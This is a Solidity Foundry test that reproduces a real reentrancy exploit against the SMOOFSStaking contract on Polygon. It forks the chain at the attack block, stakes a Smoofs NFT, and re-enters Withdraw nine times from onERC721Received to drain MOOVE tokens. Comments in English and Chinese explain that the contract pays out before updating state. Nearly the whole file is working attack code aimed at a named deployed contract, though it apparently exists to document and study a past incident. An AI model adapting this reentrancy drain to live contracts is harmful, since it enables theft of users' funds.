// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : Unclear
// Attacker : https://polygonscan.com/address/0x149b268b8b8101e2b5df84a601327484cb43221c
// Attack Contract : https://polygonscan.com/address/0x367120bf791cc03f040e2574aea0ca7790d3d2e5
// Vuln Contract : https://polygonscan.com/address/0x9d6cb01fb91f8c6616e822cf90a4b3d8eb0569c6
// One of the attack txs : https://phalcon.blocksec.com/explorer/tx/polygon/0xde51af983193b1be3844934b2937a76c19610ddefcdd3ffcf127db3e68749a50

// @Analysis
// https://twitter.com/AnciliaInc/status/1762893563103428783
// https://twitter.com/0xNickLFranklin/status/1762895774311178251

interface ISMOOFSStaking {
    function Stake(uint256 _tokenId) external;

    function Withdraw(uint256 _tokenId, bool forceWithTax) external;
}

// The whole logic is:SMOOFSStaking 是一个项目，在这个项目中，用户可以使用Smoof NFT通过Stake函数替换成MOOVE代币，之后便可以调用Withdraw函数将置换的MOOVE全部取出
// 然后这个项目的问题就出在Withdraw函数，在该函数中是先转移NTF到该合约并把钱转给了攻击者，再改变攻击者在该合约中持有的代币数量，而在转移NFT的函数中，其函数重新调用了
// 攻击合约中的内容，而攻击合约在其接收函数中多次重复上述逻辑便可
// 还有一个重要的原因是因为在子调用中改变了状态变量是不会影响父调用中的变量的值
contract ContractTest is Test {
    ISMOOFSStaking private constant SMOOFSStaking = ISMOOFSStaking(0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C);
    IERC721 private constant Smoofs = IERC721(0x551eC76C9fbb4F705F6b0114d1B79bb154747D38);
    IERC20 private constant MOOVE = IERC20(0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d);
    address private constant attackContract = 0x367120bf791cC03F040E2574AeA0ca7790D3D2E5;
    uint256 private constant smoofsTokenId = 2_062;
    uint256 setCount;

    function setUp() public {
        vm.createSelectFork("polygon", 54056707);
        vm.label(address(SMOOFSStaking), "SMOOFSStaking");
        vm.label(address(Smoofs), "Smoofs");
        vm.label(address(MOOVE), "MOOVE");
        vm.label(attackContract, "attackContract");
    }

    function testExploit() public {
        // For the purpose of this poc transfer Smoofs NFT token from original attack contract
        vm.prank(attackContract);
        Smoofs.transferFrom(attackContract, address(this), smoofsTokenId);
        Smoofs.approve(address(SMOOFSStaking), smoofsTokenId);

        // Set initial MOOVE token balance of this contract before attack
        console.log("Before deal, the balance of MOOVE is:", MOOVE.balanceOf(address(this)));
        ///@notice function deal accept 3 params: token type, receiver and token amount.
        deal(address(MOOVE), address(this), MOOVE.balanceOf(attackContract));
        console.log("After deal, the balance of MOOVE is:", MOOVE.balanceOf(address(this)));
        MOOVE.approve(address(SMOOFSStaking), type(uint256).max);

        emit log_named_decimal_uint(
            "Attacker MOOVE balance before exploit",
            MOOVE.balanceOf(address(this)),
            MOOVE.decimals()
        );
        // In my case call to Stake() take some time when I ran POC for the first time.
        SMOOFSStaking.Stake(smoofsTokenId);
        SMOOFSStaking.Withdraw(smoofsTokenId, true);

        emit log_named_decimal_uint(
            "Attacker MOOVE balance after exploit",
            MOOVE.balanceOf(address(this)),
            MOOVE.decimals()
        );
    }

    // 进入重入，开始回调
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        while (setCount < 9) {
            ++setCount;
            Smoofs.safeTransferFrom(address(this), address(SMOOFSStaking), smoofsTokenId);
            SMOOFSStaking.Withdraw(smoofsTokenId, true);
        }
        return this.onERC721Received.selector;
    }
}
